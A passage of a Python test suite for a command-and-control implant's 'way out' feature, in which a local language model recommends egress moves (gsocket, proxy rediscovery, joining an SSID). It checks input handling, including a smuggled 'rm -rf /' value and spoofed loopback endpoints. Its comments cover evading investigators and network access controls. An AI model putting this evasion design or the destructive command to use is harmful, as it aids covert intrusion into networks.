#!/usr/bin/env python3
"""The handoff: one file each way between the beacon and the scout.

`beacon.py` is served to a target as source text and may import only the
standard library, so the scout -- which captures with scapy and asks a
model -- cannot live in it and cannot be imported by it. The two halves
meet over two files under the configured state directory, and this module
is about those files and nothing else.

**Not `/tmp`.** Both units set `PrivateTmp=true`, so each process would
get its own private `/tmp` and the handoff would silently never happen.
The directory is configured, and `c2.way_out.state_dir` is where.

**The beacon's side is one file, and it is a cost.** The beacon holds no
task queue and writes nothing but persistence artefacts
(`beacon.py:10387-10408`); this adds one. It is one line of JSON, it says
nothing about the team server, and it is removed when a leg delivers.
Both claims are tested here.

**Fresh or ignored.** A document older than the scout's publishing
interval is ignored, so a dead scout degrades to today's five lines of
evidence rather than to a stale decision. A document from the *future* is
ignored too: a clock that jumped would otherwise make one eternally
fresh.

**The two dead flags stop being dead.** `dot1x_seen` and
`portal_answered` are in the rescue record's format and rendered by the
team server, and until this work nothing set them. The scout sets them
now, the beacon ORs them into the record, and a policy may name them.
"""

import base64
import json
import os
import shutil
import sys
import tempfile
import time
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(REPO_ROOT))

from software.c2 import beacon as beacon_mod
from software.c2 import dns_rescue
from software.c2.beacon import Beacon, read_egress_policy, read_way_out_policy
from software.scout import handoff
from software.tests import test_egress_decider as _decider

_KEY = b"\x24" * 32


class WayOutCase(unittest.TestCase):
    """A beacon whose state directory is this test's own."""

    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="raccoon-way-out-")
        self.addCleanup(shutil.rmtree, self.root, ignore_errors=True)
        self.logged = _decider._Collected()
        logger = beacon_mod.logger
        propagate = logger.propagate
        logger.addHandler(self.logged)
        logger.propagate = False

        def restore():
            logger.removeHandler(self.logged)
            logger.propagate = propagate

        self.addCleanup(restore)

    def trail(self, state_dir=None) -> list:
        """The attempts, from where they are kept: the trail."""
        path = handoff.trail_path(state_dir or self.root)
        if not os.path.exists(path):
            return []
        return [json.loads(line)
                for line in Path(path).read_text().splitlines()]

    def beacon(self, way_out=None, policy=None, **extra) -> Beacon:
        block = {
            "beacon_interval_seconds": 300,
            "jitter_percent": 0,
            "encryption_key": base64.b64encode(_KEY).decode(),
            "proxy": {"mode": "auto"},
            "https": {"enabled": False},
            "dns": {"enabled": False},
            "smb": {"enabled": False},
            "quic": {"enabled": False},
            "gsocket": {"enabled": False},
            "egress_decider": read_egress_policy(policy),
            "way_out": read_way_out_policy(
                {"enabled": True, "state_dir": self.root}
                if way_out is None else way_out),
        }
        block.update(extra)
        beacon = Beacon({"c2": block})
        self.addCleanup(setattr, beacon, "_running", False)
        return beacon

    def publish(self, state_dir=None, published=None, tap=None,
                evidence=None, recommendation=None, identity_pre_spent=False,
                version=None):
        """One scout document, as the scout writes it."""
        document = {
            "version": handoff.DOCUMENT_VERSION if version is None else version,
            "published": time.time() if published is None else published,
            "evidence": evidence if evidence is not None else {
                "legs": {name: "not_attempted"
                         for name in beacon_mod._RESCUE_TRANSPORTS},
                "flags": [],
            },
            "tap": tap if tap is not None else {"flags": []},
            "identity_pre_spent": identity_pre_spent,
            "recommendation": recommendation,
        }
        handoff.write_document(state_dir or self.root, document)
        return document


# ── the beacon's state file ──


class TestTheBeaconsStateFile(WayOutCase):
    def test_a_stuck_window_writes_one_line_of_json_the_scout_can_read(self):
        beacon = self.beacon()
        beacon._stuck_cycles = 2
        beacon._record_leg("https", beacon_mod._RESCUE_CLASSES["timed_out"])
        beacon._way_out_publish_state()

        state = handoff.read_state(self.root)
        self.assertEqual(state["version"], handoff.STATE_VERSION)
        self.assertEqual(state["stuck_cycles"], 2)
        self.assertEqual(state["evidence"]["legs"]["https"], "timed_out")
        self.assertEqual(state["spent"], 0)
        # And a stamp of when this was written, which is the only thing
        # that tells the scout a beacon has stopped: the window's file is
        # removed when a leg *delivers* and never on a `kill`, a crash or
        # an OOM kill, so without it a dead beacon left the scout
        # capturing and scanning the radio for ever. `test_scout.py` holds
        # the reading side.
        self.assertLess(abs(time.time() - state["touched"]), 60)
        # And not the attempts: the file is rewritten whole on every one
        # of them, `budget` has no upper bound, and nothing read the list.
        # The trail beside it is the record. See
        # `Beacon._way_out_record_attempt`.
        self.assertNotIn("attempts", state)

    def test_it_says_nothing_about_the_team_server(self):
        # The one new artefact on the implant's disk. A file naming the
        # callback URL, the DNS zone or the key would be a second place an
        # investigator finds the operator's infrastructure.
        beacon = self.beacon(
            https={"enabled": True,
                   "callback_url": "https://c2.example.com/api/v1/beacon"},
            dns={"enabled": True, "domain": "rescue.example.com",
                 "resolver": "8.8.8.8"})
        beacon._stuck_cycles = 2
        beacon._way_out_publish_state()

        text = Path(handoff.state_path(self.root)).read_text()
        for secret in ("c2.example.com", "rescue.example.com", "8.8.8.8",
                       base64.b64encode(_KEY).decode()):
            self.assertNotIn(secret, text)

    def test_the_beacon_writes_the_window_and_the_trail_and_no_more(self):
        # Three files are the beacon's in all: the window, the trail, and
        # rung 4's request -- and rung 4 needs a scout document, so a
        # window with no document leaves two. The count matters because
        # the page gives the operator a table of six and the footprint of
        # a device built to look like an IP phone is the one number that
        # has to be right.
        beacon = self.beacon()
        beacon._stuck_cycles = 2
        beacon._way_out_publish_state()
        beacon._way_out_record_attempt({"verb": "gsocket"})
        self.assertEqual(sorted(os.listdir(self.root)),
                         [handoff.STATE_NAME, handoff.TRAIL_NAME])

    def test_it_is_private(self):
        beacon = self.beacon()
        beacon._stuck_cycles = 2
        beacon._way_out_publish_state()
        mode = os.stat(handoff.state_path(self.root)).st_mode & 0o777
        self.assertEqual(mode, 0o600)

    def test_a_leg_delivering_removes_it(self):
        beacon = self.beacon()
        beacon._stuck_cycles = 2
        beacon._way_out_publish_state()
        self.assertIsNotNone(handoff.read_state(self.root))

        beacon._leg_recovered()
        self.assertIsNone(handoff.read_state(self.root))
        self.assertFalse(os.path.exists(handoff.state_path(self.root)))

    def test_an_attempt_is_recorded_into_it(self):
        beacon = self.beacon()
        beacon._stuck_cycles = 2
        beacon._way_out_publish_state()
        beacon._way_out_record_attempt({"verb": "gsocket", "rung": 2})
        beacon._way_out_record_attempt({"verb": "proxy", "rung": 2})

        attempts = self.trail()
        self.assertEqual([entry["verb"] for entry in attempts],
                         ["gsocket", "proxy"])
        for entry in attempts:
            self.assertIn("at", entry)
            self.assertIn("window", entry)

    def test_with_the_feature_off_nothing_is_written_at_all(self):
        beacon = self.beacon(way_out={"enabled": False,
                                      "state_dir": self.root})
        beacon._stuck_cycles = 2
        beacon._way_out_publish_state()
        beacon._way_out_record_attempt({"verb": "gsocket"})
        self.assertEqual(os.listdir(self.root), [])

    def test_a_state_directory_that_cannot_be_written_costs_nothing(self):
        # A read-only /opt, a full disk, a path that is a file. The beacon
        # is the access: a handoff that cost it its loop would be the worst
        # trade available on a dropped device.
        unwritable = os.path.join(self.root, "a-file")
        Path(unwritable).write_text("not a directory\n")
        for state_dir in (unwritable, os.path.join(unwritable, "under"),
                          "/proc/way-out-cannot-live-here"):
            with self.subTest(state_dir=state_dir):
                beacon = self.beacon(way_out={"enabled": True,
                                              "state_dir": state_dir})
                beacon._stuck_cycles = 2
                beacon._way_out_publish_state()
                beacon._way_out_record_attempt({"verb": "gsocket"})
                beacon._way_out_clear_state()
                self.assertIsNone(beacon._way_out_document())


class TestTheLoopItself(_decider.DeciderCase):
    """The seam: a stuck cycle through the real `_beacon_loop`.

    Every other test here reaches into the beacon and turns the crank by
    hand, which is how this whole feature shipped **inert** once: the two
    methods that write the state file and absorb the tap's flags were
    defined, tested, documented -- and called from nowhere. A review
    caught it, and this class is what makes that impossible to repeat.
    So: no direct calls below. The loop does it or it does not happen.
    """

    POLICY = {"enabled": True, "budget": 3,
              "rules": [{"when": {"https": ["not_attempted"]},
                         "try": "rediscover"}]}

    def setUp(self):
        super().setUp()
        self.state = tempfile.mkdtemp(prefix="raccoon-way-out-loop-")
        self.addCleanup(shutil.rmtree, self.state, ignore_errors=True)

    def beacon(self, policy=None):
        return self.a_beacon(
            policy=policy,
            way_out=read_way_out_policy({"enabled": True,
                                         "state_dir": self.state}))

    def test_a_stuck_cycle_writes_the_state_file_the_scout_reads(self):
        beacon = self.beacon()
        self.run_cycles(beacon, 2)

        state = handoff.read_state(self.state)
        self.assertIsNotNone(state, "no stuck window reached the scout: the "
                                    "loop never published one")
        self.assertEqual(state["stuck_cycles"], 2)
        self.assertEqual(state["evidence"], beacon._egress_state())

    def test_a_delivering_leg_removes_it_through_the_loop(self):
        beacon = self.beacon()
        self.run_cycles(beacon, 2)
        self.assertIsNotNone(handoff.read_state(self.state))

        # An upstream leg delivering is the one event that closes a window.
        beacon._leg_recovered()
        self.assertIsNone(handoff.read_state(self.state))

    def test_the_taps_flags_reach_the_record_through_the_loop(self):
        beacon = self.beacon()
        handoff.write_document(self.state, {
            "version": handoff.DOCUMENT_VERSION, "published": time.time(),
            "evidence": {}, "tap": {"flags": ["dot1x_seen"]},
            "identity_pre_spent": False, "recommendation": None})

        self.run_cycles(beacon, 2)
        self.assertTrue(beacon._rescue_flags & dns_rescue.FLAG_DOT1X_SEEN,
                        "the scout saw 802.1X on the port and the record "
                        "does not say so")
        self.assertIn("dot1x_seen",
                      handoff.read_state(self.state)["evidence"]["flags"])

    def trail(self) -> list:
        """The attempts, from where they are kept: the trail."""
        path = handoff.trail_path(self.state)
        if not os.path.exists(path):
            return []
        return [json.loads(line)
                for line in Path(path).read_text().splitlines()]

    def test_an_attempt_made_by_the_loop_reaches_the_trail(self):
        # Thirteen cycles and not two, and that is the arithmetic rather
        # than the harness: switching `c2.way_out` on puts the three verbs
        # the decider has always had behind the curve as well, and the
        # borrow rung crosses at one hour dark -- twelve cycles at the
        # shipped 300 s interval. `TestTheCostOfSwitchingItOn` below holds
        # that cost on purpose; here it is just the reason for the count.
        beacon = self.beacon(policy=self.POLICY)
        self.record_attempts(beacon, answer="Proxy discovery re-run: 0")
        beacon._stuck_cycles = 11
        self.run_cycles(beacon, 1)

        attempts = self.trail()
        self.assertEqual([entry["verb"] for entry in attempts],
                         ["rediscover"])
        self.assertEqual(attempts[0]["chose"], "policy")
        self.assertIn("gate", attempts[0])

    def test_with_the_feature_off_the_loop_writes_nothing(self):
        beacon = self.a_beacon(
            policy=self.POLICY,
            way_out=read_way_out_policy({"enabled": False,
                                         "state_dir": self.state}))
        self.record_attempts(beacon)
        self.run_cycles(beacon, 2)
        self.assertEqual(os.listdir(self.state), [])


class TestTheCostOfSwitchingItOn(_decider.DeciderCase):
    """Enabling the way out costs the borrow rung its first hour.

    With `c2.way_out` off, the three verbs the decider has always had fire
    on the first cycle the decider may act. With it on, they are priced
    like everything else, and the borrow rung's crossing is one hour dark
    -- twelve cycles at the shipped interval. That is a real cost to an
    operator who switches this on, it is the same shape as the decider's
    own documented one-cycle cost, and the tap can buy it back: a portal
    the host got past lowers the rung's detection probability enough to
    cross at hour zero.
    """

    POLICY = {"enabled": True, "budget": 3,
              "rules": [{"when": {"https": ["not_attempted"]},
                         "try": "rediscover"}]}

    def setUp(self):
        super().setUp()
        self.state = tempfile.mkdtemp(prefix="raccoon-way-out-cost-")
        self.addCleanup(shutil.rmtree, self.state, ignore_errors=True)

    def attempts(self, enabled, cycles, flags=()):
        """What the loop asked `egress` to do on the `cycles`th stuck one.

        `flags` arrive the way they really arrive -- through the scout's
        document -- and not by writing `_rescue_flags`, which
        `_start_cycle` clears at the top of every cycle. A test that set
        the field directly would be testing nothing the loop does.
        """
        beacon = self.a_beacon(
            policy=self.POLICY,
            way_out=read_way_out_policy({"enabled": enabled,
                                         "state_dir": self.state}))
        if flags:
            handoff.write_document(self.state, {
                "version": handoff.DOCUMENT_VERSION,
                "published": time.time(), "evidence": {},
                "tap": {"flags": list(flags)},
                "identity_pre_spent": False, "recommendation": None})
        asked = self.record_attempts(beacon)
        beacon._stuck_cycles = cycles - 1
        self.run_cycles(beacon, 1)
        return asked

    def test_with_it_off_the_old_verbs_fire_on_the_first_acting_cycle(self):
        self.assertEqual(self.attempts(False, 2), ["rediscover"])

    def test_with_it_on_they_wait_for_the_curve(self):
        self.assertEqual(self.attempts(True, 2), [])
        self.assertEqual(self.attempts(True, 12), ["rediscover"])

    def test_a_portal_the_host_got_past_buys_that_hour_back(self):
        self.assertEqual(self.attempts(True, 2, flags=["portal_answered"]),
                         ["rediscover"])


# ── the document the beacon reads ──


class TestTheDocumentTheBeaconReads(WayOutCase):
    def test_a_fresh_document_is_read(self):
        self.publish()
        self.assertIsNotNone(self.beacon()._way_out_document())

    def test_a_document_older_than_the_window_is_ignored(self):
        self.publish(published=time.time() - 901)
        self.assertIsNone(self.beacon()._way_out_document())

    def test_a_document_exactly_at_the_window_is_still_read(self):
        self.publish(published=time.time() - 899)
        self.assertIsNotNone(self.beacon()._way_out_document())

    def test_a_document_published_in_the_future_is_ignored(self):
        # A clock that jumped forward and back would otherwise make one
        # document eternally fresh -- and the freshness rule is the whole
        # reason a dead scout degrades to the policy instead of to a stale
        # decision.
        self.publish(published=time.time() + 3600)
        self.assertIsNone(self.beacon()._way_out_document())

    def test_a_truncated_document_reads_as_absent(self):
        self.publish()
        path = handoff.document_path(self.root)
        whole = Path(path).read_text()
        for cut in (0, 1, len(whole) // 2, len(whole) - 2):
            with self.subTest(cut=cut):
                Path(path).write_text(whole[:cut])
                self.assertIsNone(self.beacon()._way_out_document())

    def test_a_document_that_is_not_an_object_reads_as_absent(self):
        path = handoff.document_path(self.root)
        for text in ("[]", '"a string"', "null", "17", "\x00\x01"):
            with self.subTest(text=text):
                Path(path).write_text(text)
                self.assertIsNone(self.beacon()._way_out_document())

    def test_a_document_of_another_version_reads_as_absent(self):
        self.publish(version=handoff.DOCUMENT_VERSION + 1)
        self.assertIsNone(self.beacon()._way_out_document())

    def test_with_the_feature_off_the_document_is_not_read(self):
        self.publish()
        beacon = self.beacon(way_out={"enabled": False,
                                      "state_dir": self.root})
        self.assertIsNone(beacon._way_out_document())


class TestWhoDecides(WayOutCase):
    """A fresh recommendation for *this* evidence, or the policy."""

    POLICY = {"enabled": True, "budget": 3,
              "rules": [{"when": {"https": ["not_attempted"]},
                         "try": "rediscover"}]}

    def test_without_a_document_the_policy_decides_exactly_as_today(self):
        beacon = self.beacon(policy=self.POLICY)
        self.assertEqual(beacon._egress_decide(), "rediscover")

    def test_a_recommendation_for_this_evidence_is_taken(self):
        beacon = self.beacon(policy=self.POLICY)
        self.publish(evidence=beacon._egress_state(),
                     recommendation={"verb": "gsocket", "chose": "model"})
        self.assertEqual(beacon._egress_decide(), "gsocket")

    def test_a_recommendation_for_other_evidence_is_ignored(self):
        beacon = self.beacon(policy=self.POLICY)
        stale = beacon._egress_state()
        stale["legs"]["https"] = "timed_out"
        self.publish(evidence=stale,
                     recommendation={"verb": "gsocket", "chose": "model"})
        self.assertEqual(beacon._egress_decide(), "rediscover")
        self.assertTrue(
            any("evidence" in message for message in self.logged.warnings),
            "a recommendation set aside said nothing: %r"
            % (self.logged.warnings,))

    def test_a_stale_recommendation_is_ignored(self):
        beacon = self.beacon(policy=self.POLICY)
        self.publish(published=time.time() - 901,
                     evidence=beacon._egress_state(),
                     recommendation={"verb": "gsocket", "chose": "model"})
        self.assertEqual(beacon._egress_decide(), "rediscover")

    def test_a_recommendation_naming_no_verb_is_ignored(self):
        beacon = self.beacon(policy=self.POLICY)
        for bad in ({}, {"verb": ""}, {"verb": "sleep"}, {"verb": 17},
                    "not an object", []):
            with self.subTest(bad=bad):
                self.publish(evidence=beacon._egress_state(),
                             recommendation=bad)
                self.assertEqual(beacon._egress_decide(), "rediscover")

    def test_a_recommendations_argument_reaches_the_verb(self):
        # The design's central justification for a model on the device is
        # that "once the moves take arguments -- which proxy, which
        # credential, which identity, which SSID -- the policy becomes a
        # table nobody maintains". A review found the argument collected,
        # carried and then dropped: every verb ran bare.
        beacon = self.beacon(policy=self.POLICY)
        asked = []
        beacon._exec_egress = lambda task: asked.append(task) or "recorded"
        beacon._stuck_cycles = 24 * 12
        self.publish(evidence=beacon._egress_state(),
                     recommendation={"verb": "radio", "chose": "model",
                                     "argument": "Visitors"})

        self.assertTrue(beacon._egress_act())
        self.assertEqual(asked, ["radio Visitors"])

    def test_an_argument_reaches_the_trail_as_well(self):
        beacon = self.beacon(policy=self.POLICY)
        beacon._exec_egress = lambda task: "recorded"
        beacon._stuck_cycles = 24 * 12
        beacon._way_out_publish_state()
        self.publish(evidence=beacon._egress_state(),
                     recommendation={"verb": "radio", "chose": "model",
                                     "argument": "Visitors"})
        beacon._egress_act()

        attempt = self.trail()[-1]
        self.assertEqual(attempt["argument"], "Visitors")
        self.assertEqual(attempt["task"], "radio Visitors")

    def test_an_argument_with_a_space_in_it_is_refused(self):
        # The task string is split on whitespace by `_exec_egress`, so an
        # argument carrying one would silently become a different verb's
        # argument -- and this one comes from a model.
        beacon = self.beacon(policy=self.POLICY)
        asked = []
        beacon._exec_egress = lambda task: asked.append(task) or "recorded"
        beacon._stuck_cycles = 24 * 12
        self.publish(evidence=beacon._egress_state(),
                     recommendation={"verb": "radio", "chose": "model",
                                     "argument": "Guest Wifi; rm -rf /"})

        self.assertTrue(beacon._egress_act())
        self.assertEqual(asked, ["radio"], "the argument was taken as given")

    def test_a_document_with_no_recommendation_leaves_the_policy_alone(self):
        beacon = self.beacon(policy=self.POLICY)
        self.publish(evidence=beacon._egress_state())
        self.assertEqual(beacon._egress_decide(), "rediscover")


# ── the two dead flags ──


class TestTheTwoDeadFlagsAreAliveNow(WayOutCase):
    def test_the_beacon_ors_the_taps_flags_into_the_rescue_record(self):
        beacon = self.beacon()
        self.publish(tap={"flags": ["dot1x_seen", "portal_answered"]})
        beacon._way_out_absorb_flags()
        self.assertTrue(beacon._rescue_flags
                        & dns_rescue.FLAG_DOT1X_SEEN)
        self.assertTrue(beacon._rescue_flags
                        & dns_rescue.FLAG_PORTAL_ANSWERED)

    def test_they_reach_the_evidence_a_rule_is_written_against(self):
        beacon = self.beacon()
        self.publish(tap={"flags": ["dot1x_seen"]})
        beacon._way_out_absorb_flags()
        self.assertIn("dot1x_seen", beacon._egress_state()["flags"])

    def test_a_flag_name_the_tap_does_not_have_is_not_absorbed(self):
        beacon = self.beacon()
        self.publish(tap={"flags": ["proxy_found", "nonesuch", 17]})
        beacon._way_out_absorb_flags()
        # `proxy_found` is a *leg's* finding, not the tap's: absorbing it
        # from a document would let the scout claim a proxy refused this
        # implant when no leg ever tried one.
        self.assertEqual(beacon._rescue_flags, 0)

    def test_nothing_is_absorbed_without_a_document(self):
        beacon = self.beacon()
        beacon._way_out_absorb_flags()
        self.assertEqual(beacon._rescue_flags, 0)

    def test_a_policy_naming_them_is_no_longer_refused(self):
        for flag in ("dot1x_seen", "portal_answered"):
            with self.subTest(flag=flag):
                policy = read_egress_policy(
                    {"enabled": True, "budget": 1,
                     "rules": [{"when": {"flags": [flag]},
                                "try": "gsocket"}]})
                self.assertTrue(policy["enabled"])
                self.assertEqual(policy["rules"][0]["when"]["flags"], [flag])

    def test_no_flag_name_is_dead_any_more(self):
        self.assertEqual(beacon_mod._EGRESS_DEAD_FLAGS, {})

    def test_the_four_flag_bits_still_match_dns_rescue(self):
        # The copy-comparison `test_dns_rescue.py` makes for the record's
        # format, for the policy's own mapping: all four names are live
        # now, so all four belong to one vocabulary and not two.
        self.assertEqual(
            beacon_mod._EGRESS_FLAG_BITS,
            {"proxy_found": dns_rescue.FLAG_PROXY_FOUND,
             "dot1x_seen": dns_rescue.FLAG_DOT1X_SEEN,
             "portal_answered": dns_rescue.FLAG_PORTAL_ANSWERED,
             "dns_answered": dns_rescue.FLAG_DNS_ANSWERED})

    def test_a_rule_naming_a_tap_flag_on_a_build_with_no_scout_is_named(self):
        # Not refused: it is the same situation as a `gsocket` rule on a
        # build with no carrier binary, and the reader cannot see
        # `c2.way_out` anyway. Said out loud by the beacon that *can* see
        # both, while the operator still has a connection to read it over.
        beacon = self.beacon(
            way_out={"enabled": False, "state_dir": self.root},
            policy={"enabled": True, "budget": 1,
                    "rules": [{"when": {"flags": ["dot1x_seen"]},
                               "try": "gsocket"}]})
        self.assertTrue(
            any("dot1x_seen" in message for message in self.logged.warnings),
            "nothing was said about a rule that can never match: %r"
            % (self.logged.warnings,))
        # And the rule is still there, with its number, because a dropped
        # rule would renumber the ones below it.
        self.assertEqual([number for number, _ in beacon._egress_rules], [1])


# ── one vocabulary, two files ──


class TestTheCopiesAreHeldTogether(WayOutCase):
    def test_the_beacons_file_names_match_the_scouts(self):
        self.assertEqual(beacon_mod._WAY_OUT_STATE_NAME, handoff.STATE_NAME)
        self.assertEqual(beacon_mod._WAY_OUT_DOCUMENT_NAME,
                         handoff.DOCUMENT_NAME)
        self.assertEqual(beacon_mod._WAY_OUT_TRAIL_NAME, handoff.TRAIL_NAME)
        self.assertEqual(beacon_mod._WAY_OUT_BORROW_NAME, handoff.BORROW_NAME)
        self.assertEqual(beacon_mod._WAY_OUT_IDENTITY_NAME,
                         handoff.IDENTITY_NAME)

    def test_the_beacons_versions_match_the_scouts(self):
        self.assertEqual(beacon_mod._WAY_OUT_STATE_VERSION,
                         handoff.STATE_VERSION)
        self.assertEqual(beacon_mod._WAY_OUT_DOCUMENT_VERSION,
                         handoff.DOCUMENT_VERSION)

    def test_the_beacons_module_level_imports_are_still_stdlib_only(self):
        # Walked as syntax and not searched as text: "from software" appears
        # in this file's own comments about why there is no such import, and
        # a substring check would both find those and print ten thousand
        # lines of source when it failed.
        #
        # Module level is the line that matters: it is what a generated
        # single-file build executes the moment it starts. Two lazy imports
        # exist on drop-box-only paths and predate this work -- `yaml` in
        # `_configured_capture_dir` and `beacon_standalone`'s CONFIG_PATHS
        # in `_raccoon_config_paths` -- and they are named here rather than
        # excused silently. This project adds neither a module-level import
        # nor a lazy one, and in particular imports no part of the scout:
        # that is why the five names and two versions above are copies.
        import ast
        source = (REPO_ROOT / "software" / "c2" / "beacon.py").read_text()
        tree = ast.parse(source)

        def roots(nodes):
            found = set()
            for node in nodes:
                if isinstance(node, ast.Import):
                    found.update(a.name.split(".")[0] for a in node.names)
                elif isinstance(node, ast.ImportFrom) and node.level == 0:
                    found.add((node.module or "").split(".")[0])
            return found

        third_party = ("scapy", "requests", "flask", "cryptography",
                       "aiohttp", "croniter", "numpy", "netifaces")
        module_level = roots(tree.body)
        anywhere = roots(ast.walk(tree))
        for name in third_party + ("software", "yaml"):
            self.assertNotIn(name, module_level,
                             "beacon.py imports %r at module level" % name)
        for name in third_party:
            self.assertNotIn(name, anywhere, "beacon.py imports %r" % name)

        lazy = sorted(
            (node.module or "") for node in ast.walk(tree)
            if isinstance(node, ast.ImportFrom) and node.level == 0
            and (node.module or "").split(".")[0] == "software")
        self.assertEqual(lazy, ["software.c2.beacon_standalone"],
                         "beacon.py imports a new part of this package")
        self.assertNotIn("software.scout", source,
                         "beacon.py reaches into the scout; the handoff is "
                         "files and copies, on purpose")


# ── the policy reader ──


class TestTheWayOutBlock(WayOutCase):
    """Read once, refused with its reason, never raising. As the decider's is."""

    def read(self, block):
        return read_way_out_policy(block)

    def refused(self, block):
        policy = self.read(block)
        self.assertFalse(policy["enabled"])
        self.assertEqual(len(self.logged.warnings), 1,
                         "one refusal, one line: %r" % (self.logged.warnings,))
        return self.logged.warnings[0]

    def test_an_absent_block_is_off_and_says_nothing(self):
        policy = self.read(None)
        self.assertFalse(policy["enabled"])
        self.assertEqual(self.logged.warnings, [])

    def test_the_defaults_are_the_designs_numbers(self):
        policy = self.read({"enabled": True, "state_dir": "/opt/raccoon/state"})
        self.assertTrue(policy["enabled"])
        self.assertEqual(policy["document_max_age_seconds"], 900)
        self.assertEqual(policy["points_per_hour"], 5)
        self.assertEqual(policy["points_max"], 100)
        self.assertEqual(policy["risk_coefficient"], 33)
        self.assertEqual(policy["ev_threshold"], 0)
        self.assertEqual(policy["dot1x_detect"], 0.15)
        self.assertEqual(policy["portal_detect"], -0.10)
        self.assertEqual(policy["model"], {"enabled": False, "endpoint":
                                           "http://127.0.0.1:11434",
                                           "name": "",
                                           "timeout_seconds": 120})
        self.assertEqual(self.logged.warnings, [])

    def test_a_block_that_is_not_a_mapping_is_refused_by_value(self):
        self.assertIn("True", self.refused(True))

    def test_an_unknown_key_is_refused_by_name(self):
        self.assertIn("'stat_dir'",
                      self.refused({"enabled": True, "stat_dir": "/x"}))

    def test_a_quoted_boolean_is_refused_rather_than_read(self):
        # The gsocket leg's rule and the decider's: `bool("false")` is
        # True, and this setting is the whole difference between an implant
        # that acts on its own and one that does not.
        self.assertIn("'false'", self.refused({"enabled": "false"}))

    def test_an_enabled_block_with_no_state_dir_is_refused(self):
        message = self.refused({"enabled": True, "state_dir": ""})
        self.assertIn("state_dir", message)
        self.assertIn("PrivateTmp", message)

    def test_a_state_dir_under_tmp_is_refused_with_the_reason(self):
        # The trap this block exists to avoid: both units set
        # PrivateTmp=true, so each process gets its own /tmp and the
        # handoff would silently never happen.
        message = self.refused({"enabled": True, "state_dir": "/tmp/raccoon"})
        self.assertIn("/tmp", message)
        self.assertIn("PrivateTmp", message)

    def test_a_modifier_pointing_the_wrong_way_is_refused(self):
        # The ladder's one structural promise is printed in bold on the
        # operator's page -- "you cannot write a policy line that inverts
        # that" -- and one legal sign did. `dot1x_detect: -0.4` put the
        # irreversible rung two hours ahead of the reversible one, and the
        # page's own wording ("raises the identity rung's by 0.15")
        # invites an operator thinking in "less detectable" to write it.
        for key, value in (("dot1x_detect", -0.15), ("dot1x_detect", -0.4),
                           ("portal_detect", 0.1), ("portal_detect", 0.9)):
            with self.subTest(key=key, value=value):
                self.logged.records = []
                message = self.refused({"enabled": True,
                                        "state_dir": "/opt/raccoon/state",
                                        key: value})
                self.assertIn(key, message)
                self.assertIn("raises" if key == "dot1x_detect" else "lowers",
                              message)

    def test_a_number_that_would_make_the_gate_meaningless_is_refused(self):
        # Legal values at the old floors closed the gate for ever or
        # opened it completely on the first acting cycle -- including for
        # the three verbs that worked before this feature existed.
        # `_way_out_points`' own docstring says the operator must not be
        # able to buy a loud rescue with a number in a file.
        for key, value in (("points_per_hour", 0), ("points_max", 1),
                           ("points_max", 20), ("risk_coefficient", 1),
                           ("risk_coefficient", 9),
                           ("ev_threshold", -1000),
                           ("document_max_age_seconds", 1),
                           ("document_max_age_seconds", 29)):
            with self.subTest(key=key, value=value):
                self.logged.records = []
                message = self.refused({"enabled": True,
                                        "state_dir": "/opt/raccoon/state",
                                        key: value})
                self.assertIn(key, message)

    def test_a_number_that_is_not_one_is_refused(self):
        for key, value in (("document_max_age_seconds", "900"),
                           ("document_max_age_seconds", 0),
                           ("document_max_age_seconds", True),
                           ("points_per_hour", -1),
                           ("points_max", 0),
                           ("risk_coefficient", 0),
                           ("ev_threshold", "nought"),
                           ("dot1x_detect", "a lot"),
                           ("portal_detect", 2.0)):
            with self.subTest(key=key, value=value):
                self.logged.records = []
                message = self.refused({"enabled": True,
                                        "state_dir": "/opt/raccoon/state",
                                        key: value})
                self.assertIn(key, message)
                self.assertIn(repr(value), message)

    def test_a_refusal_leaves_nothing_to_read_or_write(self):
        policy = self.read({"enabled": True, "state_dir": "/tmp/raccoon"})
        self.assertFalse(policy["enabled"])
        self.assertEqual(policy["state_dir"], "")

    def test_every_non_loopback_endpoint_is_refused(self):
        # The table is shared with `test_scout_model.py`, which holds the
        # scout's copy of the same check: two processes, two
        # implementations, one answer per form.
        from software.tests.test_scout_model import LOOPBACK_ENDPOINTS
        for endpoint, allowed in LOOPBACK_ENDPOINTS:
            if allowed:
                continue
            with self.subTest(endpoint=endpoint):
                self.logged.records = []
                message = self.refused(
                    {"enabled": True, "state_dir": "/opt/raccoon/state",
                     "model": {"endpoint": endpoint}})
                self.assertIn("loopback", message)

    def test_every_loopback_endpoint_is_accepted(self):
        from software.tests.test_scout_model import LOOPBACK_ENDPOINTS
        for endpoint, allowed in LOOPBACK_ENDPOINTS:
            if not allowed:
                continue
            with self.subTest(endpoint=endpoint):
                self.logged.records = []
                policy = self.read(
                    {"enabled": True, "state_dir": "/opt/raccoon/state",
                     "model": {"endpoint": endpoint}})
                self.assertEqual(self.logged.warnings, [])
                self.assertEqual(policy["model"]["endpoint"], endpoint)

    def test_a_bad_model_block_is_refused_with_the_offending_value(self):
        for block, needle in (
                ({"model": "yes"}, "'yes'"),
                ({"model": {"enabled": "true"}}, "'true'"),
                ({"model": {"nonesuch": 1}}, "'nonesuch'"),
                ({"model": {"endpoint": "http://10.0.0.1:11434"}},
                 "loopback"),
                # A host that merely *mentions* loopback is not loopback.
                # A check by substring would dial whatever the file named,
                # which is the whole thing this setting exists to stop.
                ({"model": {"endpoint": "http://model.lan/?at=127.0.0.1"}},
                 "loopback"),
                ({"model": {"endpoint": "http://127.0.0.1.evil.lan"}},
                 "loopback"),
                ({"model": {"timeout_seconds": 0}}, "timeout_seconds")):
            with self.subTest(block=block):
                self.logged.records = []
                block = dict(block)
                block.update({"enabled": True,
                              "state_dir": "/opt/raccoon/state"})
                self.assertIn(needle, self.refused(block))

    def test_the_model_ships_off(self):
        policy = self.read({"enabled": True,
                            "state_dir": "/opt/raccoon/state",
                            "model": {"name": "qwen2.5:0.5b"}})
        self.assertFalse(policy["model"]["enabled"])


class TestTheConfigLoaderCarriesTheBlock(WayOutCase):
    def test_the_block_is_always_present_in_a_beacon_config(self):
        built = beacon_mod.beacon_config_from_fallback({"fallback": {}})
        self.assertIn("way_out", built["c2"])
        self.assertFalse(built["c2"]["way_out"]["enabled"])

    def test_a_generated_build_has_no_block_and_the_feature_is_off(self):
        # The distribution rule: a build the team server generates carries
        # no configs/raccoon.yaml, so there is nothing to read and every
        # behaviour this project adds is off.
        beacon = Beacon({"c2": {
